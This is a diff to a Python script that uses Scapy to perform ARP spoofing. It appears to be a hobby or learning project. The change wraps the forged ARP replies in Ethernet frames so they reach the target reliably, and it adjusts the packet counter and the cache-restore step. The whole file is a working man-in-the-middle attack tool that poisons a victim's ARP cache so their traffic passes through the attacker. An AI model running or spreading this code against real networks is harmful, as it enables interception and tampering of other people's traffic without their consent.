@@ -24,15 +24,17 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #this is tell the target IP and MAC that you are at the MAC of the spoof IP 
+    ether_frame = scapy.Ether(dst=target_mac)/packet
+    scapy.sendp(ether_frame, verbose=False)
 
 def restore(target_ip, spoof_ip): 
     dest_mac = get_mac(target_ip)
     src_mac = get_mac(spoof_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=spoof_ip, hwsrc=src_mac)
-    print(f"[+] Restoring ARP cache for {target_ip} and {spoof_ip}")
-    scapy.send(packet, verbose=False, count=4)
+    ether_frame = scapy.Ether(dst=dest_mac)/packet
+    print(f"[+] Restoring ARP cache for {spoof_ip}")
+    scapy.sendp(ether_frame, verbose=False, count=4)
 
 
 sent_packet_count = 0
@@ -41,9 +43,10 @@ options = get_args()
 try: 
     while True:
         spoof(options.target_ip, options.spoof_ip)
-        sent_packet_count += 2
+        sent_packet_count += 1
         print("[+] Packets sent: " + str(sent_packet_count), end='\r')
         time.sleep(2)
 except KeyboardInterrupt: 
     print(" [+] Detected CRT + C ........ Restoring ARP")
     restore(options.spoof_ip, options.target_ip)
+    
